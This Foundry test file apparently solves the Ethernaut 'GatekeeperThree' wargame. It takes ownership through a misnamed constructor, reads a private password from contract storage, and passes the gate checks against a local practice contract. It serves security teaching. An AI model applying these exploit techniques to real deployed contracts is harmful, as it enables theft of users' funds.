// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperThree.sol";
import "@forge-std/Test.sol";

contract Attack{
    GatekeeperThree public g3Contract;

    constructor(address payable g3) {
        g3Contract = GatekeeperThree(g3);
    }

    function pwn(bytes32 pass) public returns(bool ans, address nedded){
        g3Contract.getAllowance(uint(pass));
        ans = g3Contract.enter();
        nedded = g3Contract.entrant();
    }

    function callConstruct0r() public {
      g3Contract.construct0r();
    }
}

contract GatekeeperThreeTest is Test {

    GatekeeperThree public g3contract;
    address public attacker;
    function setUp() public {
        g3contract = new GatekeeperThree();
        attacker = vm.addr(1);
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker); // setting address and tx.origin
        Attack attack = new Attack(payable(g3contract));
        attack.callConstruct0r();
        assertEq(g3contract.owner(), address(attack));
        (bool success,) = payable(g3contract).call{value: 0.002 ether}("");
        require(success, "failed");
        assert(address(g3contract).balance == 0.002 ether);
        g3contract.createTrick();
        bytes32 pass1 = vm.load(address(g3contract.trick()), bytes32(uint256(2)));
        (bool result, address ned) = attack.pwn(pass1);
        vm.stopPrank();
        assert(result == true);
        assert(g3contract.entrant() == attacker);
    }
}